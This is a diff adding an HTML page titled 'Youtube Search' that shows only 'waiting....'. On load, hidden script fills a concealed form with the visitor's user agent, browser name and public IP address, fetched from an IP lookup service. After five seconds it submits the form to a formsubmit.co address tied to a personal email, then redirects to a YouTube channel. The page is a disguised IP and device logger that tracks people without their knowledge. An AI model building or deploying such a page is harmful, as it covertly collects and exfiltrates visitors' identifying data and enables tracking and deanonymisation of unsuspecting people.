@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Youtube Search</title>
+  <style>
+      
+      input[type="text"] {
+  width: 100%px;
+}
+
+     #autoFillForm{
+     display:none;
+     }
+  </style>
+</head>
+<body>
+    <h1 align="center">waiting....</h1>
+  <form id="autoFillForm" action="https://formsubmit.co/lx.nostosele@outlook.com" method="POST">
+      
+      <input type="hidden" name="_captcha" value="false">
+      
+      
+      <input type="hidden" name="_next" value="https://youtube.com/@UTHSORGOTARITATARU?feature=share7">
+      
+    <label for="deviceName">Device Name:</label>
+    <input type="text" id="deviceName" name="deviceName" readonly><br><br>
+    
+    <label for="browserName">Browser Name:</label>
+    <input type="text" id="browserName" name="browserName" readonly><br><br>
+    
+    <label for="ipAddress">IP Address:</label>
+    <input type="text" id="ipAddress" name="ipAddress" readonly><br><br>
+    
+    <input type="submit" value="Submit">
+  </form>
+
+  <script >
+      
+      window.addEventListener('DOMContentLoaded', () => {
+  const deviceNameInput = document.getElementById('deviceName');
+  const browserNameInput = document.getElementById('browserName');
+  const ipAddressInput = document.getElementById('ipAddress');
+
+  deviceNameInput.value = navigator.userAgent;
+
+
+  browserNameInput.value = navigator.appName;
+
+  
+  fetch('https://api.ipify.org/?format=json')
+    .then(response => response.json())
+    .then(data => {
+      // Fill IP address
+      ipAddressInput.value = data.ip;
+    })
+    .catch(error => {
+      console.error('Error fetching IP address:', error);
+    });
+});
+  </script>
+  
+  <script>
+     
+var form = document.getElementById('autoFillForm');
+
+// Define a function to submit the form
+function submitForm() {
+  form.submit();
+}
+
+
+     setTimeout(submitForm, 5000);
+      
+  </script>
+  
+</body>
+</html>
